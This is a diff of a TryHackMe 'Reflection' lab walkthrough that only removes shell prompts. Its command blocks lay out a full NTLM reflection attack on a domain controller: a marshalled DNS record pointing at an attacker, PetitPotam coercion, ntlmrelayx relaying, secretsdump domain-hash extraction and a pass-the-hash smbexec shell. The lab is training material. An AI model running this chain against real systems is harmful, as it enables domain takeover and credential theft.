@@ -154,7 +154,7 @@ Password: R3flect0r
 Run a full aggressive scan:
 
 ```
-$ nmap -sCV -T5 TARGET_IP
+ nmap -sCV -T5 TARGET_IP
 ```
 
 Example output (abridged):
@@ -189,7 +189,7 @@ PORT     STATE SERVICE       VERSION
 Check SMB signing and coercion status with NetExec:
 
 ```
-$ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus
+ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus
 ```
 
 ![NTLM_Relay](TryHackMe_Reflection_NXC.jpg)
@@ -199,7 +199,7 @@ $ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus
 Add the marshalled DNS record pointing at the attacker:
 
 ```
-$ python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add \
+ python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add \
   --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
   --data ATTACKER_IP TARGET_IP
 ```
@@ -209,12 +209,12 @@ $ python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add \
 Verify the record exists:
 
 ```
-$ python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action query \
+ python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action query \
   --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
   --data ATTACKER_IP TARGET_IP
 
 # or using dig
-$ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.reflection.thm @TARGET_IP
+ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.reflection.thm @TARGET_IP
 ```
 
 ![NTLM_Relay](TryHackMe_Reflection_LDAP_Bind_Queried_validated.jpg)
@@ -224,7 +224,7 @@ $ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.reflection.thm @TARG
 Start `ntlmrelayx` to intercept and relay NTLM authentication back to the target SMB service:
 
 ```
-$ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support --no-http-server
+ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support --no-http-server
 ```
 
 ![NTLM_Relay](TryHackMe_Reflection_Local_SAM_Dump.jpg)
@@ -232,7 +232,7 @@ $ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support --no-http-server
 Coerce the host to authenticate using NetExec + PetitPotam:
 
 ```
-$ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus \
+ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus \
   -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 ```
 
@@ -253,7 +253,7 @@ While not strictly necessary for domain-controller targets, you can crack dumped
 Because the target in this lab is a domain controller, local SAM hashes alone are not enough to fully authenticate to the machine. Re-run `ntlmrelayx` with an interactive SMB shell:
 
 ```
-$ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -i
+ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -i
 ```
 
 ![NTLM_Relay](TryHackMe_Reflection_SMB_11000.jpg)
@@ -271,14 +271,14 @@ Use `netexec` again with the same `LISTENER` value to coerce authentication. If 
 To extract domain credentials from a DC, create a SOCKS proxy for relayed sessions and use `impacket-secretsdump` through the proxy to leverage VSS:
 
 ```
-$ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -socks
+ impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -socks
 
 # then coerce authentication as before
-$ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus \
+ netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus \
   -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 
 # use proxychains with port 1080 (socks4)
-$ proxychains4 -q impacket-secretsdump TARGET_IP -no-pass -just-dc -use-vss
+ proxychains4 -q impacket-secretsdump TARGET_IP -no-pass -just-dc -use-vss
 ```
 
 The output can include NTLM hashes for domain accounts — use these for lab questions requiring the SVC account hash or other domain credentials.
@@ -290,7 +290,7 @@ The output can include NTLM hashes for domain accounts — use these for lab que
 Open a remote elevated shell using an extracted hash (example format):
 
 ```
-$ python3 /usr/share/doc/python3-impacket/examples/smbexec.py \
+ python3 /usr/share/doc/python3-impacket/examples/smbexec.py \
   -hashes XXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXX \
   -u svc TARGET_IP
 ```
